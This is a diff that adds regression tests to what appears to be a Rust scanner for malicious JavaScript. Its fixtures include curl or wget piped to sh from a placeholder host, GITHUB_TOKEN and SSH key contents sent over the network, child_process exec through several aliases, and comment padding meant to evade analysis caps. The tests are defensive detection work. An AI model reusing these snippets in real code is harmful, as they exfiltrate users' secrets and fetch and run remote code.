@@ -442,3 +442,154 @@ fn large_single_line_js_finishes_within_budget() {
         "neither a budget signal nor a completed analysis: {sigs:#?}"
     );
 }
+
+// ---- Review fix round 1 regressions ----
+
+fn budget_hit(sigs: &[Signal]) -> bool {
+    of_kind(sigs, HIDDEN)
+        .iter()
+        .any(|s| field(s, "pattern") == "parse_budget_exceeded")
+}
+
+#[test]
+fn i1_dead_redeclaration_does_not_cancel_sink_alias() {
+    let js = "const { exec } = require('child_process');\n\
+              exec('curl https://x.invalid/i | sh');\n\
+              function unused() { const exec = require('./noop'); }\n";
+    let sigs = run(&[("a.js", js)]);
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![2], "{sigs:#?}");
+
+    let js = "const cp = require('child_process');\n\
+              if (0) { const cp = require('util'); }\n\
+              cp.exec('id');\n";
+    let sigs = run(&[("b.js", js)]);
+    assert_eq!(sink_lines(&sigs, "exec"), vec![3], "{sigs:#?}");
+
+    // Network objects are kept per name as well.
+    let js = "const net = require('net');\n\
+              let s = new net.Socket();\n\
+              if (0) { s = new Map(); }\n\
+              s.write(process.env.GITHUB_TOKEN);\n";
+    let sigs = run(&[("c.js", js)]);
+    assert_eq!(flows(&sigs, "secret_env", "network").len(), 1, "{sigs:#?}");
+}
+
+#[test]
+fn i2_comments_do_not_hide_names_from_child_caps() {
+    let c: String = (0..70).map(|i| format!("/*{i}*/ ")).collect();
+    let cases = [
+        format!("import {{ {c} exec }} from 'child_process';\nexec('id');\n"),
+        format!("const {{ {c} exec }} = require('child_process');\nexec('id');\n"),
+    ];
+    for (i, js) in cases.iter().enumerate() {
+        let sigs = run(&[(format!("a{i}.mjs").as_str(), js)]);
+        assert_eq!(sink_lines(&sigs, "exec"), vec![2], "case {i}: {sigs:#?}");
+        assert!(!budget_hit(&sigs), "comments must not count: {sigs:#?}");
+    }
+    let env = format!(
+        "const {{ {c} GITHUB_TOKEN }} = process.env;\nfetch('https://x.invalid', {{ body: GITHUB_TOKEN }});\n"
+    );
+    let sigs = run(&[("b.js", &env)]);
+    assert_eq!(flows(&sigs, "secret_env", "network").len(), 1, "{sigs:#?}");
+
+    let piped = format!(
+        "const cp = require('child_process');\ncp.exec({c} 'curl https://x.invalid/p | sh');\n"
+    );
+    let sigs = run(&[("c.js", &piped)]);
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![2], "{sigs:#?}");
+    let req = format!("require({c} 'child_process').exec('id');\n");
+    assert_eq!(sink_lines(&run(&[("d.js", &req)]), "exec"), vec![1]);
+
+    // More real children than the cap: the analysis says it is partial.
+    let names: String = (0..70).map(|i| format!("a{i}, ")).collect();
+    let wide = format!("const {{ {names} exec }} = require('child_process');\nexec('id');\n");
+    assert!(budget_hit(&run(&[("e.js", &wide)])), "cap hit not reported");
+}
+
+#[test]
+fn m1_require_aliases_and_dynamic_import_then() {
+    let js = "const r = require;\n\
+              r('child_process').exec('id');\n\
+              module.require('child_process').exec('id');\n\
+              import { createRequire } from 'module';\n\
+              createRequire(import.meta.url)('child_process').exec('id');\n\
+              const req = createRequire(import.meta.url);\n\
+              req('child_process').execSync('id');\n\
+              import('child_process').then(cp => cp.exec('id'));\n\
+              import('child_process').then(({ exec }) => exec('id'));\n";
+    let sigs = run(&[("a.mjs", js)]);
+    assert_eq!(
+        sink_lines(&sigs, "exec"),
+        vec![2, 3, 5, 7, 8, 9],
+        "{sigs:#?}"
+    );
+}
+
+#[test]
+fn m1_global_prefixes_resolve() {
+    let js = "const e = globalThis.eval;\n\
+              e(code);\n\
+              const { fetch: f } = globalThis;\n\
+              f('https://x.invalid', { method: 'POST', body: process.env.GITHUB_TOKEN });\n\
+              self.fetch('https://x.invalid');\n\
+              window.eval('1');\n";
+    let sigs = run(&[("a.js", js)]);
+    assert_eq!(sink_lines(&sigs, "eval"), vec![2, 6], "{sigs:#?}");
+    assert_eq!(sink_lines(&sigs, "network"), vec![4, 5], "{sigs:#?}");
+    assert_eq!(flows(&sigs, "secret_env", "network").len(), 1, "{sigs:#?}");
+}
+
+#[test]
+fn m1_string_timers_are_eval() {
+    let js = "setTimeout('alert(1)', 10);\n\
+              setInterval('tick(' + n + ')', 10);\n\
+              setTimeout(() => tick(), 10);\n\
+              globalThis.setTimeout(`run()`, 0);\n";
+    let sigs = run(&[("a.js", js)]);
+    assert_eq!(sink_lines(&sigs, "eval"), vec![1, 2, 4], "{sigs:#?}");
+}
+
+#[test]
+fn m1_concatenated_commands_are_download_exec() {
+    let js = "const cp = require('child_process');\n\
+              cp.exec('curl ' + u + ' | sh');\n\
+              cp.spawn('sh', ['-c', 'curl ' + u + ' | sh']);\n\
+              cp.spawn('/usr/bin/env', ['bash', '-c', 'curl -s ' + u + '|bash']);\n\
+              cp.spawn('dash', ['-c', 'wget -qO- ' + u + ' | sh']);\n\
+              cp.exec('cu' + u + 'rl x | sh');\n\
+              cp.spawn('/usr/bin/env', ['node', '-c', 'curl x | sh']);\n";
+    let sigs = run(&[("a.js", js)]);
+    assert_eq!(
+        sink_lines(&sigs, "download_exec"),
+        vec![2, 3, 4, 5],
+        "{sigs:#?}"
+    );
+    assert_eq!(sink_lines(&sigs, "exec"), vec![6, 7], "{sigs:#?}");
+}
+
+#[test]
+fn m2_callback_params_take_taint_only_from_first_value_argument() {
+    let write = "const fs = require('fs');\n\
+                 fs.writeFile('out.txt', process.env.API_TOKEN, err => fetch(s, { body: String(err) }));\n";
+    let sigs = run(&[("a.js", write)]);
+    assert!(
+        flows(&sigs, "secret_env", "network").is_empty(),
+        "{sigs:#?}"
+    );
+
+    let read = "const fs = require('fs');\n\
+                fs.readFile('/home/u/.ssh/id_rsa', (e, data) => fetch(u, { body: data }));\n";
+    let sigs = run(&[("b.js", read)]);
+    assert_eq!(flows(&sigs, "secret_file", "network").len(), 1, "{sigs:#?}");
+
+    // A sibling function argument passes nothing to the other callback.
+    let sibling = "function h() { return process.env.GITHUB_TOKEN; }\n\
+                   p.then(h, (e) => fetch(u, { body: e }));\n\
+                   const g = () => process.env.GITHUB_TOKEN;\n\
+                   q.then(g, (e2) => fetch(u, { body: e2 }));\n";
+    let sigs = run(&[("c.js", sibling)]);
+    assert!(
+        flows(&sigs, "secret_env", "network").is_empty(),
+        "{sigs:#?}"
+    );
+}
